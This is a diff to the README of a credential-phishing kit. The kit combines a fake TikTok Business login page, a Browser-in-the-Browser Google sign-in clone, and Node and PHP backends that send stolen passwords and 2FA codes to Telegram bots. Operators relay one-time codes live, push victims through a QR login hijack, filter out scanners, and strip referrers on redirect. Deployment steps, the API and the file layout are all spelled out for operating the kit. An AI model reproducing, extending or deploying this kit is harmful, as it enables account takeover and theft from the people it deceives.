@@ -4,6 +4,8 @@ A static frontend (`fe`), a PHP credential-collection app (`googlephish`), and a
 
 **Email / phone + password (TikTok form)** — `POST` to `be`, poll until approved or rejected; optional 2FA round. No PHP involved.
 
+**Log in with TikTok** — `POST` to `be` with `{ tiktok_login: true }`, bot sends a message; operator replies with a QR/image URL; client polls until `show_image` and displays the image in a modal.
+
 **Sign in with Google** — a Browser-in-the-Browser (BITB) overlay loads `googlephish` in an iframe. The PHP flow sends captures to Telegram Bot B.
 
 ---
@@ -13,13 +15,15 @@ A static frontend (`fe`), a PHP credential-collection app (`googlephish`), and a
 ```
 Browser (fe)
   │
-  ├── POST /login + poll ───────→ be (Node) ──→ Telegram Bot A
+  ├── POST /login (password) + poll ─────→ be (Node) ──→ Telegram Bot A
+  │                                                           │
+  ├── POST /login (tiktok_login:true) + poll ───────────────→│ (reply with image URL)
   │
-  └── BITB overlay (iframe) ────→ googlephish (PHP)
-                                      └── Telegram Bot B
+  └── BITB overlay (iframe) ────────────→ googlephish (PHP)
+                                              └── Telegram Bot B
 ```
 
-Run **`be`** whenever you use the TikTok email/password form. **`googlephish`** is only required for the Google button (BITB).
+Run **`be`** whenever you use the TikTok email/password or "Log in with TikTok" flows. **`googlephish`** is only required for the Google button (BITB).
 
 - **`fe/`** — Plain HTML/CSS/JS. No build step. Served statically.
 - **`googlephish/`** — PHP pages cloning Google sign-in UI. Captures email, password, and OTP/SMS codes and pushes them to Telegram Bot B. The operator drives the victim step-by-step via Telegram inline buttons.
@@ -96,12 +100,12 @@ window.APP_CONFIG = {
 };
 ```
 
-- **`apiBaseUrl`** — Node `be` origin (no trailing slash). Used only for **Log in** (email/phone + password).
+- **`apiBaseUrl`** — Node `be` origin (no trailing slash). Used for **Log in** (email/phone + password) and **Log in with TikTok**.
 - **`googlephishBaseUrl`** — PHP app origin. Used only for **Sign in with Google** (BITB iframe). There is no Google SDK or OAuth client ID in the frontend.
 
 ### 4 — Configure the Node backend
 
-Required for the TikTok **Log in** (password) flow.
+Required for the TikTok **Log in** (password) and **Log in with TikTok** flows.
 
 ```bash
 cp be/.env.example be/.env
@@ -181,7 +185,7 @@ Server starts on `http://localhost:4000`.
 
 ## Setting the Telegram Webhook (Bot A)
 
-Bot A is the Node backend webhook for Telegram inline-button presses (approve / reject / 2FA).
+Bot A is the Node backend webhook for Telegram inline-button presses (approve / reject / 2FA) and TikTok image URL replies.
 
 ### Step 1 — Expose the backend
 
@@ -230,13 +234,56 @@ Bot B is auto-configured. The PHP app calls `setWebhook` pointing at `<website_u
 
 ---
 
+## Login Flows
+
+### Password login flow
+
+1. User submits email/phone + password in the TikTok form.
+2. `fe` → `POST /login` with `{ username, password }`.
+3. `be` creates a pending request (UUID), sends a Telegram message to Bot A with inline buttons: **Approve**, **Reject**, **2FA Email**, **2FA Phone**, **2FA App**.
+4. `fe` polls `GET /login-status?request_id=<id>` every `authPollIntervalMs` ms for up to `authPollMaxMs` ms.
+5. Operator presses a button. Telegram sends a callback to `POST /telegram/webhook`.
+   - **Approve** → status becomes `approved` → `fe` redirects to `afterLoginRedirectUrl`.
+   - **Reject** → status becomes `rejected` → `fe` shows error banner.
+   - **2FA** → status becomes `2fa` with `two_fa_type` (`email` / `phone` / `totp`) → `fe` shows 2FA input.
+6. *If 2FA:* User enters code → `fe` → `POST /submit-2fa` → `be` forwards code to Telegram with new Approve / Reject buttons → operator approves/rejects → `fe` continues polling.
+
+Request TTL is **2 minutes**. Expired requests return `rejected` on the next poll.
+
+### TikTok QR login flow
+
+1. User clicks **Log in with TikTok**.
+2. `fe` → `POST /login` with `{ tiktok_login: true }` (or `POST /tiktok-login`).
+3. `be` creates a pending request, sends a Telegram message (Bot A) instructing the operator to reply with an image URL.
+4. `fe` polls `GET /login-status`.
+5. Operator replies to the bot message with the image URL in one of these formats:
+   ```
+   image_url: https://example.com/qr.png
+   ```
+   or just the bare URL on a single line:
+   ```
+   https://example.com/qr.png
+   ```
+6. Webhook handler updates the request status to `show_image` and stores the URL.
+7. Next poll returns `{ status: "show_image", image_url: "..." }` → `fe` shows the QR image modal.
+
+### Google BITB flow
+
+1. User clicks **Sign in with Google**.
+2. `fe` opens a Browser-in-the-Browser overlay (fake Chrome window) containing an iframe loaded from `googlephishBaseUrl`.
+3. PHP multi-step Google sign-in clone collects email → password → 2FA/SMS.
+4. Each step POSTs to `process.php`, which forwards captured data to Telegram Bot B with step navigation buttons.
+5. The `be` Node backend is **not involved** in this path.
+
+---
+
 ## Configuration Reference
 
 ### `fe/config.js`
 
 | Key | Required | Description |
 |-----|----------|-------------|
-| `apiBaseUrl` | For password login | Node `be` origin, no trailing slash (`POST /login`, poll `/login-status`) |
+| `apiBaseUrl` | For password / TikTok login | Node `be` origin, no trailing slash (`POST /login`, poll `/login-status`) |
 | `authPollIntervalMs` | No | Milliseconds between status polls (default `1500`) |
 | `authPollMaxMs` | No | Max time to poll before timeout (default `3` minutes) |
 | `googlephishBaseUrl` | For Google button | Public URL of the PHP app (no trailing slash); BITB iframe only |
@@ -244,9 +291,9 @@ Bot B is auto-configured. The PHP app calls `setWebhook` pointing at `<website_u
 | `bitbDisplayUrl` | No | URL shown in the fake Chrome address bar |
 | `bitbTabTitle` | No | Text of the fake Chrome tab |
 | `bitbFaviconUrl` | No | Favicon in the fake Chrome tab |
-| `bitbLabLabel` | No | Optional banner in the fake title bar; empty hides it |
+| `bitbLabLabel` | No | Optional banner in the fake title bar; empty string hides it |
 | `afterLoginRedirectUrl` | No | Browser redirect after Telegram **approval** on password flow |
-| `afterLoginRedirectDelayMs` | No | Delay before redirect (default `0`) |
+| `afterLoginRedirectDelayMs` | No | Delay before redirect in ms (default `0`) |
 
 ### `googlephish/config.json`
 
@@ -281,15 +328,76 @@ Bot B is auto-configured. The PHP app calls `setWebhook` pointing at `<website_u
 
 ---
 
-## Node backend API Reference
+## Node Backend API Reference
 
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/login` | Submit login (`{ username, password }` or `{ credential }`). Returns `{ status: "pending", request_id }`. |
-| `GET` | `/login-status?request_id=<id>` | Poll status: `pending` / `approved` / `rejected` / `2fa`. |
-| `POST` | `/submit-2fa` | Submit 2FA code `{ request_id, code }`. |
-| `POST` | `/telegram/webhook` | Telegram webhook receiver (called by Telegram, not the browser). |
-| `GET` | `/health` | Returns `{ ok: true }`. |
+### `POST /login`
+
+Submit a login request. Returns `202` with `{ status: "pending", request_id }`.
+
+**Password login:**
+```json
+{ "username": "user@example.com", "password": "secret" }
+```
+
+**TikTok QR login:**
+```json
+{ "tiktok_login": true }
+```
+
+**Google token (direct):**
+```json
+{ "credential": "<Google ID token>" }
+```
+
+---
+
+### `GET /login-status?request_id=<id>`
+
+Poll the status of a login request.
+
+| Status | Meaning | Extra fields |
+|--------|---------|--------------|
+| `pending` | Awaiting operator action | — |
+| `approved` | Operator approved | — |
+| `rejected` | Operator rejected or expired | — |
+| `2fa` | Operator requested a 2FA code | `two_fa_type` (`email`/`phone`/`totp`), `request_id` |
+| `show_image` | Operator provided a TikTok QR image URL | `image_url` |
+
+Returns `404` if the request is unknown or has expired (TTL: 2 minutes).
+
+---
+
+### `POST /submit-2fa`
+
+Submit a 2FA code after receiving `status: "2fa"`.
+
+```json
+{ "request_id": "<id>", "code": "123456" }
+```
+
+Returns `202 { status: "pending", request_id }`. The code is forwarded to Telegram; continue polling `/login-status`.
+
+---
+
+### `POST /tiktok-login`
+
+Alias for `POST /login` with `{ tiktok_login: true }`. Same response.
+
+---
+
+### `POST /telegram/webhook`
+
+Telegram Bot A webhook receiver. Called by Telegram, not the browser. Validates `X-Telegram-Bot-Api-Secret-Token` against `TELEGRAM_WEBHOOK_SECRET` if set.
+
+Handles:
+- Inline button callbacks: `approve:<id>`, `reject:<id>`, `2fa_email:<id>`, `2fa_phone:<id>`, `2fa_totp:<id>`
+- Text replies to bot messages containing a TikTok image URL
+
+---
+
+### `GET /health`
+
+Returns `{ ok: true }`. Used as a liveness probe.
 
 ---
 
@@ -308,11 +416,15 @@ Before building, set `website_url` in `config.json` to the final public URL of t
 
 ### fe (frontend)
 
-Serve the `fe/` directory from any static host (Render Static Site, Netlify, Cloudflare Pages, Nginx, etc.). Before deploying, set **`apiBaseUrl`** to your deployed Node service and **`googlephishBaseUrl`** to your deployed PHP service (each can be on a different host).
+Serve the `fe/` directory from any static host (Render Static Site, Netlify, Cloudflare Pages, Nginx, etc.). Before deploying, update `fe/config.js`:
+- Set `apiBaseUrl` to your deployed Node `be` service URL.
+- Set `googlephishBaseUrl` to your deployed PHP service URL.
+
+Each service can run on a different host/domain.
 
 ### be (Node backend)
 
-Deploy as a Node 18 web service for the password login path. Set all `be/.env` variables in your hosting dashboard. After deploying, run the `setWebhook` curl command once.
+Deploy as a Node 18+ web service. Set all `be/.env` variables in your hosting dashboard. After deploying, run the `setWebhook` curl command once to register Bot A's webhook URL.
 
 ---
 
@@ -320,42 +432,45 @@ Deploy as a Node 18 web service for the password login path. Set all `be/.env` v
 
 ```
 tk-ap/
-├── be/                          # Node.js Express API (TikTok password + Telegram Bot A)
+├── be/                          # Node.js Express API (TikTok password + TikTok QR + Telegram Bot A)
 │   ├── .env.example
 │   ├── package.json
 │   ├── server.js
 │   └── src/
-│       ├── app.js
-│       ├── config.js
+│       ├── app.js               # Express app factory (cors, json, route mounts)
+│       ├── config.js            # Env → constants (PORT, TELEGRAM_BOT_TOKEN, etc.)
 │       ├── lib/
-│       │   ├── clientIp.js
+│       │   ├── clientIp.js      # X-Forwarded-For / socket IP extraction
 │       │   ├── store.js         # In-memory request store (TTL 2 min)
-│       │   └── telegram.js      # Telegram API wrapper
+│       │   └── telegram.js      # Telegram API wrapper + message builders
 │       └── routes/
-│           ├── health.js
-│           ├── login.js
-│           └── telegram.js      # Webhook handler
-├── fe/                          # Static frontend
-│   ├── config.js                # apiBaseUrl (be) + googlephishBaseUrl (BITB)
-│   ├── index.html
-│   ├── main.js
-│   ├── style.css
+│           ├── health.js        # GET /health
+│           ├── login.js         # POST /login, GET /login-status, POST /submit-2fa, POST /tiktok-login
+│           └── telegram.js      # POST /telegram/webhook (Bot A callback + TikTok image reply)
+├── fe/                          # Static frontend (no build step)
+│   ├── config.js                # Runtime config: apiBaseUrl, googlephishBaseUrl, BITB settings
+│   ├── index.html               # TikTok Business–style login page with BITB overlay
+│   ├── main.js                  # App wiring: form submit, polling, BITB open, 2FA, countdowns
+│   ├── style.css                # Full layout: form, auth banner, loader, 2FA, BITB chrome, modal
 │   └── js/
-│       ├── auth-api.js          # Password login → be (fetch + poll)
-│       ├── auth-ui.js           # Loader, banners, 2FA view, redirect after approval
-│       └── bitb-googlephish.js  # BITB iframe (Google button only)
+│       ├── auth-api.js          # HTTP client for be (login, poll, 2FA submit)
+│       ├── auth-ui.js           # UI state: loader, banners, 2FA view, TikTok image modal, redirect
+│       └── bitb-googlephish.js  # BITB overlay: fake Chrome window + iframe (Google button only)
 └── googlephish/                 # PHP Google sign-in clone
-    ├── Dockerfile
+    ├── Dockerfile               # php:8.2-apache, enables rewrite + headers modules
     ├── config.json              # Bot B token + operator chat ID + website_url
     ├── include.php              # Session bootstrap, setWebhook, Telegram helpers
-    ├── telegram_api.php         # PHP Telegram webhook handler
-    ├── index.php                # Email step
+    ├── telegram_api.php         # PHP Telegram webhook: callback routing + per-IP instruction files
+    ├── process.php              # POST handler / step router (email→password→2fa→sms)
+    ├── index.php                # Email step (Google sign-in clone)
     ├── password.php             # Password step
-    ├── 2-step.php               # 2-step verification step
-    ├── sms.php                  # SMS code step
-    ├── process.php              # POST handler / step router
-    ├── lib/
-    │   ├── config.php           # moonito.net API keys + visitor filter settings
-    │   └── detector.php         # Visitor filtering logic
-    └── telegram/                # Runtime: per-IP redirect instruction files (gitignored)
+    ├── 2-step.php               # TOTP/authenticator step
+    ├── sms.php                  # SMS recovery step
+    ├── loading.php              # Loading interstitial shown between steps
+    ├── tap.php / tap2.php       # Device/number challenge pages (driven by Telegram replies)
+    ├── complete.php             # Final step → redirect via nullreferer.php
+    ├── nullreferer.php          # Sets Referrer-Policy: no-referrer then redirects to ?link=
+    └── lib/
+        ├── config.php           # moonito.net API keys + visitor filter settings
+        └── detector.php         # Optional visitor filtering via moonito.net analytics API
 ```
